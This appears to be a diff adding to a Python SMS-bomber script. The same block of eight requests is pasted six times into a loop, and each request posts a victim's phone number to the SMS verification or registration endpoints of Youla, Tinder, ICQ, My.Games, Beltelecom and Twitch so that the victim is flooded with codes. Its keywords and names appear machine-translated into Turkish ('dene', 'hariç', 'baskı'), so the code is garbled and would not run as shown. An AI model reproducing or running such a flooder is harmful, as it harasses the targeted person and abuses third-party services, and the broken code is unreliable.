@@ -68,3 +68,250 @@ while True:
     except:
         print("Başarısız.")
     print(random.choice(colors))
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
+
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
+
+dene :
+        baskı ( istekler . post ( 'https://youla.ru/web-api/auth/request_code' , json  = { "telefon" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 2
+    dene :
+        baskı ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , json = { "phone_number" : numplus }))
+    hariç :
+        baskı ( "Başarısız." )
+# 3
+    dene :
+        baskı ( istekler . post ( 'https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763' . format ( num )))
+    hariç :
+        baskı ( "Başarısız." )
+# 4
+    dene :
+        baskı ( istekler . post ( 'https://account.my.games/signup_send_sms/' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 5
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }, başlıklar = {}))
+    hariç :
+        baskı ( "Başarısız." )
+# 6
+    dene :
+        yazdırma ( istek . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'telefon' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+# 7
+    dene :
+        baskı ( istekler . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "doğum günü" : { "gün" : 11 , "ay" : 11 , "yıl" : 1999 } , " client_id " : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : Doğru , "şifre" : şifre , "telefon_numarası" : _phone , "kullanıcı adı " : kullanıcı adı}))
+    hariç :
+        baskı ( "Başarısız." )
+# 8
+    dene :
+        yazdır ( istekler . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : _phone }))
+    hariç :
+        baskı ( "Başarısız." )
+    Baskı ( rastgele . seçim ( renk ))
